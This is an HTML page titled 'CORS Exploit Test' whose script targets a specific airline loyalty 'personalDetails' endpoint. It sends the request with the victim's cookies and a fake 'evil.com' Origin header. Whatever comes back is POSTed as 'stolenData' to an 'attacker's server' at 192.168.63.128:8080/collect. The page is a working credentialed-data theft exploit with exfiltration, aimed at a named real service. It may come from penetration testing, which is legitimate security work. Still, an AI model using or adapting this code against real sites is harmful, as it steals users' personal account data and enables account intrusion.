<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h1>CORS Exploit Test</h1>
    <button onclick="testCORS()">Test CORS</button>
    <p id="result"></p>

    <script>
        function testCORS() {
            fetch("https://book-pia.crane.aero/ibe/loyalty/personalDetails", {
                method: "GET",
                credentials: "include", // Include cookies for authentication
                headers: {
                    "Origin": "https://evil.com" // Fake origin
                }
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById("result").innerText = "✅ CORS is misconfigured! Data leaked.";
                console.log("Leaked Data:", data);

                // Send leaked data to attacker's server (Must use HTTPS)
                fetch("https://192.168.63.128:8080/collect", { 
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ stolenData: data })
                })
                .then(response => console.log("Data sent successfully:", response))
                .catch(error => console.error("Error sending data:", error));
            })
            .catch(error => {
                console.error("Error:", error);
                document.getElementById("result").innerText = "❌ Request blocked by CORS.";
            });
        }
    </script>
</body>
</html>
